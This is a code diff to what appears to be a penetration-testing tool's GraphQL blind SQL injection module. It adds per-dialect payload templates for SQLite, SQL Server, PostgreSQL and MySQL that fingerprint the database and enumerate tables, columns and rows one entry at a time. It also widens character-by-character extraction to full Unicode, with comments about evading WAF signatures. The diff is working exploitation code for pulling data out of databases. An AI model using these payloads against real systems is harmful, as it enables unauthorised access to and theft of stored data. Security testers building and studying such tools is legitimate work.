@@ -31,6 +31,7 @@ from lib.core.settings import NOSQL_ERROR_REGEX
 from lib.core.settings import UPPER_RATIO_BOUND
 from lib.request.connect import Connect as Request
 from lib.utils.xrange import xrange
+from thirdparty.six import unichr as _unichr
 
 # Improbable literal used to build always-true/never-match payloads. Randomized per run (like
 # NOSQL_SENTINEL) so it never becomes a static signature a WAF can pin a blocking rule on.
@@ -47,9 +48,12 @@ DUMP_MAX_LENGTH = 8192
 # Maximum number of rows dumped per table (bounds a runaway blind dump)
 DUMP_MAX_ROWS = 1000
 
-# Printable-ASCII codepoint bounds for blind character inference
+# Printable-ASCII codepoint bounds for blind character inference (the fast common path);
+# a codepoint proven above CHAR_MAX is recovered over the full Unicode range instead of
+# being silently mangled into a wrong printable char.
 CHAR_MIN = 0x20
 CHAR_MAX = 0x7e
+UNICODE_MAX = 0x10FFFF
 
 # Number of independent predicates packed into a single aliased GraphQL document (batched inference)
 BATCH_SIZE = 40
@@ -89,11 +93,23 @@ _inputFields = {}
 # established on a slot. `fingerprint` is a predicate true only on that back-end (it errors -> falsy
 # elsewhere). `length`/`ordinal` render a scalar-extraction sub-expression. `delay` wraps a condition
 # in an inline conditional sleep (None where the engine offers none, e.g. SQLite). `banner`/
-# `currentUser`/`currentDb`/`tables` are generic enumeration scalars; `columns` builds the per-table
-# column list and `row(columns, table, offset)` a single row's cells joined by COL_SEP.
+# `currentUser`/`currentDb` are generic enumeration scalars. Table and column NAMES are enumerated
+# one at a time by ordinal position from a catalog source: `tableFrom`/`tableCol` and
+# `columnFrom(table)`/`columnCol` give the FROM(+WHERE) and the name column, `paginate(col, offset)`
+# adds the per-dialect single-row window. `row(columns, table, offset)` is one data row's cells
+# joined by COL_SEP. Per-item enumeration avoids a GROUP_CONCAT/STRING_AGG scalar that the back-end
+# would silently truncate (e.g. MySQL group_concat_max_len=1024).
 Dialect = namedtuple("Dialect", ("fingerprint", "length", "ordinal", "delay",
                                  "banner", "currentUser", "currentDb",
-                                 "tables", "columns", "row"))
+                                 "tableFrom", "tableCol", "columnFrom", "columnCol", "paginate", "row"))
+
+
+def _limitOffset(col, offset):
+    return "ORDER BY %s LIMIT 1 OFFSET %d" % (col, offset)
+
+
+def _offsetFetch(col, offset):
+    return "ORDER BY %s OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY" % (col, offset)
 
 
 # A row is extracted one at a time by ordinal position (LIMIT/OFFSET). Concatenating
@@ -129,19 +145,25 @@ DIALECTS = OrderedDict((
         banner="SQLITE_VERSION()",
         currentUser=None,
         currentDb=None,
-        tables="(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%')",
-        columns=lambda table: "(SELECT GROUP_CONCAT(name) FROM pragma_table_info('%s'))" % table,
+        tableFrom="FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'",
+        tableCol="name",
+        columnFrom=lambda table: "FROM pragma_table_info('%s')" % table,
+        columnCol="name",
+        paginate=_limitOffset,
         row=_sqliteRow)),
     ("Microsoft SQL Server", Dialect(
         fingerprint="@@VERSION LIKE '%Microsoft%'",
         length=lambda expr: "LEN((%s))" % expr,
-        ordinal=lambda expr, pos: "ASCII(SUBSTRING((%s),%d,1))" % (expr, pos),
+        ordinal=lambda expr, pos: "UNICODE(SUBSTRING((%s),%d,1))" % (expr, pos),   # ASCII() truncates non-ASCII to a byte
         delay=None,
         banner="@@VERSION",
         currentUser="SYSTEM_USER",
         currentDb="DB_NAME()",
-        tables="(SELECT STRING_AGG(name,',') FROM sys.tables)",
-        columns=lambda table: "(SELECT STRING_AGG(name,',') FROM sys.columns WHERE object_id=OBJECT_ID('%s'))" % table,
+        tableFrom="FROM sys.tables",
+        tableCol="name",
+        columnFrom=lambda table: "FROM sys.columns WHERE object_id=OBJECT_ID('%s')" % table,
+        columnCol="name",
+        paginate=_offsetFetch,
         row=_mssqlRow)),
     ("PostgreSQL", Dialect(
         fingerprint="(SELECT version()) LIKE 'PostgreSQL%'",
@@ -151,8 +173,11 @@ DIALECTS = OrderedDict((
         banner="version()",
         currentUser="CURRENT_USER",
         currentDb="CURRENT_DATABASE()",
-        tables="(SELECT STRING_AGG(table_name,',') FROM information_schema.tables WHERE table_schema='public')",
-        columns=lambda table: "(SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='%s')" % table,
+        tableFrom="FROM information_schema.tables WHERE table_schema='public'",
+        tableCol="table_name",
+        columnFrom=lambda table: "FROM information_schema.columns WHERE table_name='%s'" % table,
+        columnCol="column_name",
+        paginate=_limitOffset,
         row=_pgsqlRow)),
     ("MySQL", Dialect(
         fingerprint="@@VERSION_COMMENT IS NOT NULL",
@@ -162,8 +187,11 @@ DIALECTS = OrderedDict((
         banner="VERSION()",
         currentUser="CURRENT_USER()",
         currentDb="DATABASE()",
-        tables="(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())",
-        columns=lambda table: "(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='%s')" % table,
+        tableFrom="FROM information_schema.tables WHERE table_schema=DATABASE()",
+        tableCol="table_name",
+        columnFrom=lambda table: "FROM information_schema.columns WHERE table_name='%s'" % table,
+        columnCol="column_name",
+        paginate=_limitOffset,
         row=_mysqlRow)),
 ))
 
@@ -832,10 +860,39 @@ def _fingerprint(truth):
 
 # --- Blind inference --------------------------------------------------------
 
+def _safeChr(codepoint):
+    try:
+        return _unichr(codepoint)
+    except (ValueError, OverflowError):
+        return "?"
+
+
+def _inferChar(truth, dialect, expr, pos):
+    """Recover one character's codepoint by bisection: the printable-ASCII range first
+    (fast, ~log2(95) probes), widening to the full Unicode range only when the codepoint
+    proves to be above it - so non-ASCII/UTF-8 data is recovered rather than silently
+    mangled into a wrong printable char. Control bytes below CHAR_MIN surface as '?'.
+    (MySQL's ASCII() yields the leading byte of a multibyte char, not its codepoint - a
+    documented limitation; the codepoint-returning dialects recover exactly.)"""
+
+    ordExpr = dialect.ordinal(expr, pos)
+    if not truth("%s>=%d" % (ordExpr, CHAR_MIN)):
+        return "?"
+    hi = UNICODE_MAX if truth("%s>%d" % (ordExpr, CHAR_MAX)) else CHAR_MAX
+    low, high = CHAR_MIN, hi
+    while low < high:
+        mid = (low + high + 1) // 2
+        if truth("%s>=%d" % (ordExpr, mid)):
+            low = mid
+        else:
+            high = mid - 1
+    return _safeChr(low)
+
+
 def _inferExpr(truth, dialect, expr, maxLen=MAX_LENGTH):
     # Recover the string value of SQL expression `expr` one character at a time:
-    # binary-search the length, then bisect each character's codepoint over the
-    # printable-ASCII range (~log2(95) requests per character).
+    # binary-search the length, then each character via _inferChar (printable-fast,
+    # widening to full Unicode for non-ASCII).
     lengthExpr = dialect.length(expr)
 
     if not truth("%s>0" % lengthExpr):
@@ -858,26 +915,17 @@ def _inferExpr(truth, dialect, expr, maxLen=MAX_LENGTH):
 
     value = ""
     for pos in xrange(1, length + 1):
-        ordExpr = dialect.ordinal(expr, pos)
-        if not truth("%s>=%d" % (ordExpr, CHAR_MIN)):
-            value += "?"           # codepoint outside the printable-ASCII range
-            continue
-        low, high = CHAR_MIN, CHAR_MAX
-        while low < high:
-            mid = (low + high + 1) // 2
-            if truth("%s>=%d" % (ordExpr, mid)):
-                low = mid
-            else:
-                high = mid - 1
-        value += chr(low)
+        value += _inferChar(truth, dialect, expr, pos)
     return value
 
 
-def _inferExprBatched(truthBatch, dialect, expr, maxLen=MAX_LENGTH):
+def _inferExprBatched(truthBatch, truth, dialect, expr, maxLen=MAX_LENGTH):
     # Same recovery as _inferExpr, but every probe is independent and resolved in
     # parallel via aliased batching: the length is read from monotone >=N predicates
-    # and each character from its 7 independent bit predicates (ASCII & 2**b). An
-    # L-character value costs ceil(7*L / BATCH_SIZE) requests instead of ~7*L.
+    # and each character from its 7 independent bit predicates (ASCII & 2**b) plus one
+    # ">CHAR_MAX" flag. An L-character value costs ceil(8*L / BATCH_SIZE) requests. A
+    # flagged (non-ASCII) position is then recovered exactly via `truth` bisection
+    # (the 7 bits only carry the low byte), so non-ASCII data is not mangled.
     lengthExpr = dialect.length(expr)
 
     length = 0
@@ -896,19 +944,27 @@ def _inferExprBatched(truthBatch, dialect, expr, maxLen=MAX_LENGTH):
         for bit in xrange(7):
             conditions.append("(%s & %d)>0" % (dialect.ordinal(expr, pos), 1 << bit))
             index.append((pos, bit))
+        conditions.append("%s>%d" % (dialect.ordinal(expr, pos), CHAR_MAX))
+        index.append((pos, "hi"))
 
-    codes = {}
+    codes, wide = {}, set()
     flat = []
     for chunk in _chunks(conditions, BATCH_SIZE):
         flat.extend(truthBatch(chunk))
     for (pos, bit), ok in zip(index, flat):
-        if ok:
+        if bit == "hi":
+            if ok:
+                wide.add(pos)
+        elif ok:
             codes[pos] = codes.get(pos, 0) | (1 << bit)
 
     value = ""
     for pos in xrange(1, length + 1):
-        code = codes.get(pos, 0)
-        value += chr(code) if CHAR_MIN <= code <= CHAR_MAX else "?"
+        if pos in wide:
+            value += _inferChar(truth, dialect, expr, pos)     # non-ASCII: exact recovery
+        else:
+            code = codes.get(pos, 0)
+            value += _unichr(code) if CHAR_MIN <= code <= CHAR_MAX else "?"
     return value
 
 
@@ -917,8 +973,29 @@ def _inferrer(truth, truthBatch, dialect):
     # with a known true/false pair), else fall back to sequential bisection
     if truthBatch and truthBatch(["1=1", "1=2"]) == [True, False]:
         logger.info("using aliased query batching to accelerate blind extraction")
-        return lambda expr, maxLen=MAX_LENGTH: _inferExprBatched(truthBatch, dialect, expr, maxLen)
+        return lambda expr, maxLen=MAX_LENGTH: _inferExprBatched(truthBatch, truth, dialect, expr, maxLen)
     return lambda expr, maxLen=MAX_LENGTH: _inferExpr(truth, dialect, expr, maxLen)
+
+
+def _catList(infer, dialect, col, fromClause):
+    # Enumerate a catalog name list (tables or a table's columns) one entry at a time by
+    # ordinal position, so a GROUP_CONCAT/STRING_AGG the back-end would silently truncate
+    # (e.g. MySQL group_concat_max_len=1024) can't drop names.
+    try:
+        count = int((infer("(SELECT COUNT(*) %s)" % fromClause) or "").strip())
+    except ValueError:
+        count = 0
+
+    names = []
+    for offset in xrange(min(count, DUMP_MAX_ROWS)):
+        name = infer("(SELECT %s %s %s)" % (col, fromClause, dialect.paginate(col, offset)))
+        if name:
+            names.append(name)
+
+    if count > DUMP_MAX_ROWS:
+        logger.warning("catalog lists %d names; enumerating the first %d (DUMP_MAX_ROWS cap)" % (count, DUMP_MAX_ROWS))
+
+    return names
 
 
 def _dumpTable(infer, dialect, table):
@@ -926,8 +1003,7 @@ def _dumpTable(infer, dialect, table):
     # position. A whole-table GROUP_CONCAT/STRING_AGG would be silently truncated by
     # the back-end (e.g. MySQL group_concat_max_len=1024), dropping rows; per-row
     # extraction has no such cap.
-    columnsRaw = infer(dialect.columns(table))
-    columns = [_ for _ in (columnsRaw or "").split(",") if _]
+    columns = _catList(infer, dialect, dialect.columnCol, dialect.columnFrom(table))
     if not columns:
         return None
 
@@ -1153,8 +1229,7 @@ def _enumerate(oracle):
             logger.info("%s: '%s'" % (label, value))
             conf.dumper.singleString("GraphQL %s: %s" % (label, value))
 
-    tablesRaw = infer(dialect.tables) if dialect.tables else None
-    tables = [_ for _ in (tablesRaw or "").split(",") if _]
+    tables = _catList(infer, dialect, dialect.tableCol, dialect.tableFrom)
     if not tables:
         logger.warning("no tables recovered through the oracle")
         return
